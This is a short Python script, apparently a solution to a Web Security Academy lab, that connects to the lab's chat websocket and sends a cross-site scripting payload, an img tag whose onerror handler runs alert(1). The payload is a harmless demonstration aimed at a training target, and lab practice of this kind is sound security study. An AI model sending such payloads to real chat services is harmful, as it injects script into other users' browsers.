import asyncio
import websockets
import json

async def chat():
 websocket_uri = "wss://ac3a1f651ebf5d46c06035c300270015.web-security-academy.net/chat"
 async with websockets.connect(websocket_uri) as websocket:
   msg = {'message' : "<img src=1 onerror='alert(1)'>"}
   json_msg = json.dumps(msg)
   print(f"Sending {json_msg}")
   await websocket.send(json_msg)
   resp = await websocket.recv()
   print(f"Received {resp}")

asyncio.get_event_loop().run_until_complete(chat())